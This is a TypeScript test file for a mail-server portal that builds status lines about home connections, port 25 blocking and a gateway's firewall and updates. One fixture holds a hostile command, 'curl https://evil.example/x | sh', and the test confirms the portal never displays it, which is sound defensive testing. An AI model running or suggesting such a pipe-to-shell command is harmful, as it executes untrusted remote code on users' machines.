import { describe, expect, it } from "vitest";
import type { GatewayView, PublicAddress, Reachability } from "@/lib/api";
import { gatewayLines, reachabilityLines, recommendation } from "./reach";

const address = (overrides: Partial<PublicAddress> = {}): PublicAddress => ({
  ip: "192.0.2.44",
  ptr: ["p5b0c1d2e.dip0.isp.example"],
  genericPtr: true,
  homeConnection: true,
  listed: false,
  spamhausUnknown: false,
  asn: 64500,
  network: "Example Broadband, DE",
  provider: null,
  ...overrides,
});

const reach = (overrides: Partial<Reachability> = {}): Reachability => ({
  checkedAt: 0,
  addresses: [address()],
  outbound: { at: 0, route: "direct", target: "mx.example.net:25", ok: false, stage: "connect", error: "timed out" },
  inbound: { ip: "192.0.2.44", reachable: false, ours: false, greeting: null, error: "timed out" },
  throughGateway: false,
  recommendation: "gateway",
  reasons: ["homeConnection", "port25Blocked"],
  ...overrides,
});

const codes = (lines: { code: string }[]) => lines.map((entry) => entry.code);

describe("reachability lines", () => {
  it("explains a home connection", () => {
    expect(codes(reachabilityLines(reach()))).toEqual([
      "publicAddress",
      "homeConnection",
      "port25Blocked",
      "inboundSelfCall",
    ]);
    expect(reachabilityLines(reach())[0]!.params).toEqual({
      ip: "192.0.2.44",
      network: "Example Broadband, DE, AS64500",
    });
  });

  it("names a provider once and keeps a clean rented server calm", () => {
    const hetzner = { key: "hetzner" as const, advice: "avoid" as const, source: "https://docs.example" };
    const rented = address({ homeConnection: false, genericPtr: false, provider: hetzner, network: null });
    const lines = reachabilityLines(
      reach({
        addresses: [rented, { ...rented, ip: "2001:db8::44" }],
        outbound: { at: 0, route: "direct", target: "mx.example.net:25", ok: true, stage: null, error: null },
        inbound: null,
        recommendation: "direct",
      }),
    );
    expect(codes(lines)).toEqual([
      "publicAddress",
      "spamhausClean",
      "providerHetzner",
      "publicAddress",
      "spamhausClean",
      "directOk",
    ]);
  });

  it("speaks of the gateway once mail goes through it", () => {
    const paired = reach({
      throughGateway: true,
      outbound: { at: 0, route: "gateway", target: "mx.example.net:25", ok: false, stage: "connect", error: "refused" },
      inbound: null,
    });
    expect(codes(reachabilityLines(paired))).toContain("gatewayPort25Blocked");
    expect(recommendation(paired)).toBe("paired");
  });
});

describe("gateway lines", () => {
  const view = (overrides: Partial<GatewayView>): GatewayView => ({
    state: "none",
    tunnel: ["203.0.113.10:443"],
    fingerprint: null,
    addresses: [],
    services: [],
    outboundPorts: [],
    software: null,
    connectedSince: null,
    downSince: null,
    error: null,
    refusal: null,
    fromConfig: false,
    machine: null,
    canInstall: false,
    softwareVersion: null,
    ...overrides,
  });

  it("follows the tunnel", () => {
    expect(codes(gatewayLines(view({}), "mail.example.com"))).toEqual(["gatewayNone"]);
    expect(codes(gatewayLines(view({ state: "refused", refusal: "otherServer" }), "m"))).toEqual([
      "gatewayRefusedOtherServer",
    ]);
    const connected = gatewayLines(
      view({ state: "connected", addresses: ["203.0.113.10", "2001:db8::10"] }),
      "mail.example.com",
    );
    expect(codes(connected)).toEqual(["gatewayConnected", "gatewayDns"]);
    expect(connected[1]!.params).toEqual({ hostname: "mail.example.com", addresses: "203.0.113.10, 2001:db8::10" });
  });

  it("says what the gateway's machine needs, with the command to do it", () => {
    const lines = gatewayLines(
      view({
        state: "connected",
        addresses: ["203.0.113.10"],
        machine: {
          system: {
            name: "Ubuntu 26.04.1 LTS",
            updates: 12,
            securityUpdates: 3,
            rebootRequired: true,
            automaticSecurity: true,
            newRelease: null,
            command: "curl https://evil.example/x | sh",
          },
          protection: {
            firewall: "ufw",
            firewallActive: true,
            fail2ban: true,
            banned: 2,
            jails: ["sshd", "uwumail-server"],
            fromServer: 1,
          },
          job: null,
          trusted: ["198.51.100.47"],
          checkedAt: 1_800_000_000,
        },
      }),
      "mail.example.com",
    );
    expect(codes(lines)).toEqual([
      "gatewayConnected",
      "gatewayDns",
      "gatewaySecurityUpdates",
      "gatewayAutomaticSecurity",
      "gatewayReboot",
      "gatewayProtected",
      "gatewayTrusted",
    ]);
    // The whole line to paste is this portal's own constant (with reboot, since one is required),
    // never the string the gateway sent (security-audit-0.5.2 G-4).
    expect(lines[2]!.params.ssh).toBe("ssh root@203.0.113.10 'apt-get update && apt-get -y dist-upgrade && reboot'");
    expect(lines[2]!.params.ssh).not.toContain("evil.example");
    expect(lines[2]!.level).toBe("problem");
  });

  it("is loud when the gateway lost its firewall", () => {
    const machine = {
      system: null,
      protection: { firewall: "", firewallActive: false, fail2ban: false, banned: 0, jails: [], fromServer: 0 },
      trusted: [],
      checkedAt: 1_800_000_000,
      job: null,
    };
    const lines = gatewayLines(view({ state: "connected", machine }), "mail.example.com");
    expect(codes(lines)).toContain("gatewayNoFirewall");
    expect(lines.find((one) => one.code === "gatewayNoFirewall")!.level).toBe("problem");
  });

  it("says nothing about a machine a gateway is too old to describe", () => {
    const lines = gatewayLines(view({ state: "connected", machine: null }), "mail.example.com");
    expect(codes(lines)).toEqual(["gatewayConnected", "gatewayDns"]);
  });
});
